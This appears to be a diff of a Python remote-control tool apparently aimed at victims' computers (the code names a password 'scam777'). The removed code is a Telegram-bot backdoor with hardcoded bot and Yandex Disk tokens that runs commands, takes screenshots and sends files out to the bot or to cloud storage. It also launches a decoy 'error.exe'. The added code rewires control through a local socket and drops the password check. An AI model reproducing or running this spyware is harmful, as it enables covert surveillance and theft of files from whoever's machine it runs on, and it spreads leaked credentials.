@@ -1,29 +1,18 @@
-import ctypes
 import logging
 import os
-import random
 import shutil
+import socket
 import subprocess
 import sys
 import threading
 import time
 
+import jpysocket
 import keyboard
 import mouse
 import pyautogui
-from PIL import Image, ImageGrab
+from PIL import Image
 from PIL.ImageDraw import ImageDraw
-
-from telegram import Update, ForceReply
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
-from yadisk import yadisk
-
-token = '5846510402:AAF2knMSpHRm_vCccht8mYERWkb40WE1M5Q'
-scam_disk = yadisk.YaDisk(token='y0_AgAAAAAzsvwhAAi8-gAAAADVgyY7nU2TGVVUQIKOGUIUBRWyDbY0CbY')
-password = "scam777"
-authed_users = ['']
-test_chat_id = '-1001847130553'
-banned_users_ids = [582461607]
 
 # Enable logging
 logging.basicConfig(
@@ -33,6 +22,9 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 command_multi_line = ''  # completed command for the shell (contains all commands, until clear is pressed)
+
+HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
+PORT = 26781  # Port to listen on (non-privileged ports are > 1023)
 
 
 def cmd_thread(messageText, chatId, bot):
@@ -264,21 +256,9 @@ def handle_command(bot, message):
             print(f'path is: {path}')
             print('saved')
             print(f'size: {os.path.getsize(path)}')
-            if os.path.getsize(path) < 1048576:  # telegram limit size
-                print('sending to bot')
-                bot.send_document(chatId, file, caption=f'{os.curdir}', filename=file.name)
-            else:  # yandex disk
-                print('sending to disk')
-                bot.send_message(chatId, "Uploading to disk started")
-                scam_disk.upload('../FOLDER_SAVE.zip', f'FOLDER_SAVE{random.randint(0, 10000)}.zip')
-                print('uploaded to disk')
-                result = 'Uploaded to yandex disk)))'
+            print('sending to bot')
+            bot.send_document(chatId, file, caption=f'{os.curdir}', filename=file.name)
             file.close()
-
-    elif message_text == f'exit {password}':
-        delete_password_message(bot, message)
-        bot.send_message(chatId, 'Exited, bye')
-        sys.exit(0)
 
     return result
 
@@ -288,21 +268,11 @@ def delete_password_message(bot, to_delete):
 
 
 def get_response(bot, message):
-    if banned_users_ids.__contains__(message.from_user.id):
-        return 'BANNED'
-    if not authed_users.__contains__(message.from_user.id) and message.chat_id != test_chat_id:
-        delete_password_message(bot, message)
-        if message.text == password:
-            authed_users.append(message.from_user.id)
-            return 'Authorization successful'
-        else:
-            return 'You can\'t send commands, because you are unauthorized\nEnter a password to start sending commands'
-    else:
-        response = handle_command(bot, message)
-        screenshot()
-        screenshot()
-        bot.send_photo(message.chat_id, photo=open('screenshot.png', 'rb'))
-        print('Screen 1 done')
+    response = handle_command(bot, message)
+    screenshot()
+    screenshot()
+    bot.send_photo(message.chat_id, photo=open('screenshot.png', 'rb'))
+    print('Screen 1 done')
     return response
 
 
@@ -324,43 +294,21 @@ def send_long_message(bot, chatId, textMessage):
             bot.send_message(chatId, textMessage)
 
 
-def handle_messages(update: Update, context: CallbackContext) -> None:
-    bot = context.bot
-    message = update.message
-    messageText = message.text
-    user = message.from_user
-    username = user.username
-    print(message.chat_id)
-
-    print(f'Received a message from @{username} with text: {messageText}')
-    response = get_response(bot, message)
-    send_long_message(bot, message.chat_id, response)
-
-
 def main() -> None:
     print(sys.getdefaultencoding())
-    #    locale.setlocale(locale.LC_ALL, 'ru_RU.1251')
-
-    """Start the bot."""
-    print('Bot started')
-    # Create the Updater and pass it your bot's token.
-    updater = Updater(token)
-    os.system("error.exe")
-    updater.bot.sendMessage("1280356300", "Bot is online")  # me
-    updater.bot.sendMessage("-1001847130553", "Bot is online")  # bot group
-
-    # Get the dispatcher to register handlers
-    dispatcher = updater.dispatcher
-
-    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_messages))
-
-    # Start the Bot
-    updater.start_polling()
-
-    # Run the bot until you press Ctrl-C or the process receives SIGINT,
-    # SIGTERM or SIGABRT. This should be used most of the time, since
-    # start_polling() is non-blocking and will stop the bot gracefully.
-    updater.idle()
+    # os.system("error.exe")
+    host = 'localhost'  # Host Name
+    port = 26780  # Port Number
+    s = socket.socket()  # Create Socket
+    s.connect((host, port))  # Connect to socket
+    print("Socket Is Connected....")
+    msgrecv = s.recv(16384)  # Recieve msg
+    msgrecv = jpysocket.jpydecode(msgrecv)  # Decript msg
+    print("From Server: ", msgrecv)
+    msgsend = jpysocket.jpyencode("Ok Boss.")  # Encript The Msg
+    s.send(msgsend)  # Send Msg
+    s.close()  # Close connection
+    print("Connection Closed.")
 
 
 if __name__ == '__main__':
